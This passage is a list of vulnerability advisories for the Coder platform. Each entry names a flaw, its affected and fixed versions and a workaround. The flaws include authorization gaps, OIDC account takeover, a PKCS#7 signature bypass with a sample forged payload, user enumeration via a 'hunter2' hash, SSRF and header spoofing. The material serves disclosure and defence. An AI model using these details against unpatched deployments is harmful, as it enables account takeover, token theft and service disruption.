advisories.summary: Coder before 2.29.17, 2.30.0 before 2.32.7, 2.33.0 before 2.33.8, and 2.34.0 before 2.34.2 contains a stored HTML injection vulnerability because the ApplicationName and LogoURL appearance settings are rendered into HTML output without sufficient escaping. Attackers with the Owner role can store HTML markup in these settings that renders in the Coder dashboard and in SMTP notification emails sent to other deployment users.

advisories.title: Coder: Devcontainer recreate endpoint missing write authorization allows read-only roles to destroy containers
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2, the devcontainer recreate endpoint relied on route middleware that checked only `ActionRead` on the workspace and, unlike the sibling delete endpoint, performed no `ActionUpdate` check before triggering the destructive rebuild. Exploitation requires an existing low-privilege role with access to the target workspace. The fix in versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2 adds an explicit `ActionUpdate` authorization check before the agent is dialed like the delete endpoint. No known workarounds are available.

advisories.title: Coder before 2.34.2 User Enumeration via Login Placeholder Hash
advisories.summary: Coder before 2.29.17, 2.30.0 before 2.32.7, 2.33.0 before 2.33.8, and 2.34.0 before 2.34.2 contains a user enumeration vulnerability because userpassword.Compare() substitutes a placeholder hash derived from the string "hunter2" when a stored password hash is empty. Unauthenticated attackers can submit logins with the password "hunter2" and distinguish HTTP 403 from 401 responses to enumerate valid accounts and reveal the authentication provider of SSO-only users.

advisories.title: Coder's sub-agent app registration bypasses template port-sharing policy enforcement
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2, the `CreateSubAgent` RPC did not validate a requested app sharing level against the template's `MaxPortSharingLevel` before persisting workspace apps, letting a workspace owner exceed the administrator's configured maximum. Exploitation requires the ability to register sub-agent apps in a workspace the attacker controls. The fix in versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2clamps the sub-agent app sharing level to the template's `MaxPortSharingLevel`. As a workaround, disable wildcard app hostnames (`CODER_WILDCARD_ACCESS_URL`) to block subdomain-based app routing.

advisories.title: Coder's session token leaked to arbitrary hosts via `coder open app` for external workspace apps
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2, `coder open app` opens external workspace-app URLs without validating the scheme or host. When an external app URL contains the `$SESSION_TOKEN` placeholder the CLI replaces it with the user's real session token before handing the URL to the OS open handler. Practical exploitation requires the victim to run `coder open app` against a workspace whose external app definition the attacker controls. Only a malicious template author can control external app URLs. The fix in versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2 applies a URL-scheme allowlist in the CLI and limits `$SESSION_TOKEN` substitution to trusted destinations like the web frontend. As a workaround, avoid running `coder open app` for untrusted workspaces.

advisories.title: Coder: Zip upload decompression lacks aggregate size limit, enabling denial of service
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Starting in version 2.17.0 and prior to versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2, `POST /api/v2/files` converts zip uploads to tar in memory via `CreateTarFromZip`, which enforced a per-entry size limit but no aggregate limit on total decompressed output, writing to an unbounded in-memory buffer. Exploitation requires authenticated file-upload access and the impact is limited to availability (denial of service). The fix in versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2 adds a metadata preflight check that sums projected entry sizes and a streaming writer that enforces the aggregate limit during decompression. As a workaround, restrict file-upload permissions to trusted users or place a reverse proxy with request-body size limits in front of `coderd`.

advisories.title: Coder's subdomain workspace app routing trusts unauthenticated X-Forwarded-Host header, enabling cross-app data access
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2, the workspace app proxy resolves the target app from `httpapi.RequestHost()` which prefers the `X-Forwarded-Host` header over the real `Host` header. No middleware strips `X-Forwarded-Host` before routing and the header is not browser-forbidden so client-side JavaScript can set it on `fetch()` calls. Practical exploitation requires subdomain app routing (wildcard hostname) enabled, a victim who visits the attacker's shared app and a deployment whose upstream proxy does not strip `X-Forwarded-Host`. The fix in versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2 trusts `X-Forwarded-Host` only from configured trusted proxies and otherwise resolves the routing host from the verified request host. As a workaround, place an upstream reverse proxy that strips or overwrites `X-Forwarded-Host` on untrusted requests.

advisories.title: Coder's workspace app upsert allows cross-workspace agent rebinding via user-controlled app ID
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2, `UpsertWorkspaceApp` overwrites an existing app's `agent_id` on a primary-key conflict and `insertAgentApp` accepts the app ID from the provisioner's `CompleteJob` payload without verifying it belongs to the workspace being built. `CompleteJob` runs under `dbauthz.AsProvisionerd` so the authorization layer does not block the cross-workspace upsert. Exploitation requires elevated access as a template author or external provisioner operator. The fix in versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2 verifies that any existing `workspace_apps` row matching the supplied ID belongs to the workspace being built and rejects cross-workspace agent reassignment. No known workarounds are available.

advisories.title: Coder: Route hijacking through lack of validation of agent-supplied AllowedIPs in tailnet coordinator
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2, the tailnet coordinator validates that an agent's `Addresses` derive from its authenticated UUID but applies no equivalent check to `AllowedIPs`. The coordinator forwards agent-supplied `AllowedIPs` verbatim to tunnel peers which install them into the WireGuard peer configuration. The fix in versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2 validates each `AllowedIPs` prefix against the authenticating agent's UUID just like `Addresses`. As a workaround, monitor coordinator logs for agents advertising unexpected `AllowedIPs` prefixes.

advisories.title: Coder vulnerable to SSH config injection via unsanitized server-supplied values in `coder config-ssh`
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2, `coder config-ssh` wrote server-supplied SSH settings (`HostnameSuffix`, `SSHConfigOptions`) into the user's `~/.ssh/config` without sanitizing embedded newlines or restricting directives so a malicious or compromised Coder server could inject arbitrary SSH configuration. Practical exploitation requires control of the server-supplied values through a malicious or compromised deployment, a man-in-the-middle position or admin access to the `HostnameSuffix` and `SSHConfigOptions` settings. The fix in versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2 validates `HostnameSuffix` and `SSHConfigOptions` against a strict character set that rejects newlines and other control characters. As a workaround, inspect `coder config-ssh --dry-run` output before applying changes.

advisories.title: Coder's unbounded memory allocation in provisioner file upload allows authenticated denial of service
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Starting in version 2.24.0 and prior to versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2, `NewDataBuilder` in `provisionersdk/proto/dataupload.go` allocated a byte slice using the client-supplied `FileSize` from a `DataUpload` message without an upper-bound check. Although the DRPC wire limit is 4 MiB, the `FileSize` value itself was unconstrained. The fix in versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2 validates `FileSize` against an upper bound (`MaxFileSize = 100 MiB`) before allocation. As a workaround, restrict access to the provisioner daemon serve endpoint to trusted provisioner daemon service accounts.

advisories.title: Coder: User-admin role can reset owner account password
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2, the `PUT /api/v2/users/{user}/password` endpoint authorized only `ActionUpdatePersonal` and did not prevent a `user-admin` from resetting an `owner` account's password. It also did not require the current password when an admin reset another user's password. Exploitation requires the privileged `user-admin` role so practical risk is limited to deployments that grant `user-admin` to less trusted operators. The fix in versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2 prevents non-owner users from resetting the password of an account that holds the `owner` role. As a workaround, restrict the `user-admin` role to trusted administrators.

advisories.title: Coder's OIDC email_verified type coercion bypass enables account takeover via unverified email linking
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2, Coder's OIDC callback checked `email_verified` with a direct Go `bool` type assertion. When an IdP returned the claim as a non-boolean (for example the string `"false"`) or omitted it, the assertion failed open and the email was treated as verified. Combined with an unconditional email-based account fallback, this enabled account takeover. The fix in versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2 coerces `email_verified` across bool, string and numeric types (fail-closed) and blocks the email fallback when the matched user already has a different linked IdP subject. As a workaround, ensure the IdP returns `email_verified` as a native JSON boolean. The email-fallback linking issue has no configuration workaround; upgrading is required.

advisories.title: Coder vulnerable to OIDC account takeover via email-based user matching and email_verified bypass
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2, two flaws in Coder's OIDC login chained into account takeover. Email-based user matching fell back to linking by email without checking for an existing link to a different IdP subject and the `email_verified` claim was only enforced when present as a boolean `false` so an absent or non-boolean claim was treated as verified. The fix in versions 2.29.7, 2.32.7, 2.33.8, and 2.34.2 restricts the email fallback to first-time and legacy linking and defaults `email_verified` to false when the claim is absent or of an unexpected type. As a workaround, configure the OIDC provider to disallow self-registration or to require email verification before issuing tokens.

advisories.title: Coder: PKCS#7 signature bypass in Azure instance identity allows unauthenticated agent token theft
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. In versions prior tp 2.24.5, 2.29.13, 2.30.8, 2.31.12, 2.32.2, and 2.33.3, `azureidentity.Validate()` verifies that the PKCS#7 signer certificate chains to a trusted Azure CA but never verifies the PKCS#7 signature itself. An attacker can embed a legitimate Azure certificate alongside arbitrary content e.g. `{"vmId":"<target>"}` and the forged `vmId` will be accepted returning the victim workspace agent's session token. No authentication is required. The attacker only needs to know a target VM's `vmId` which is a `UUIDv4`. That's a practical limitation which would typically require prior access to be exploited. Versions 2.24.5, 2.29.13, 2.30.8, 2.31.12, 2.32.2, and 2.33.3 patch the issue. As a workaround, reconfigure any Azure templates to use token authentication rather than `azure-instance-identity`.

advisories.title: Coder vulnerable to unauthenticated SSRF via Azure Instance Identity Endpoint
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Versions prior tp 2.24.5, 2.29.13, 2.30.8, 2.31.12, 2.32.2, and 2.33.3 are vulnerable to unauthenticated semi-blind Server-Side Request Forgery (SSRF) via the Azure instance identity endpoint (`POST /api/v2/workspaceagents/azure-instance-identity`). An external attacker can force the Coder server to issue HTTP GET requests to arbitrary internal or external hosts by submitting a crafted PKCS#7 signature. The server does not return the target's response body, but error messages in the API response reveal whether the target is reachable and what type of failure occurred. Versions 2.24.5, 2.29.13, 2.30.8, 2.31.12, 2.32.2, and 2.33.3 patch the issue. As a workaround, if the Azure identity-auth mechanism is not being used then restrict access to the corresponding endpoint (`/api/v2/workspaceagents/azure-instance-identity`) using ingress firewall and/or proxy ACLs.

advisories.title: Coder logged sensitive objects unsanitized
advisories.summary: Coder allows organizations to provision remote development environments via Terraform. Prior to 2.26.5, 2.27.7, and 2.28.4, Workspace Agent manifests containing sensitive values were logged in plaintext unsanitized. An attacker with limited local access to the Coder Workspace (VM, K8s Pod etc.) or a third-party system (SIEM, logging stack) could access those logs. This vulnerability is fixed in 2.26.5, 2.27.7, and 2.28.4.
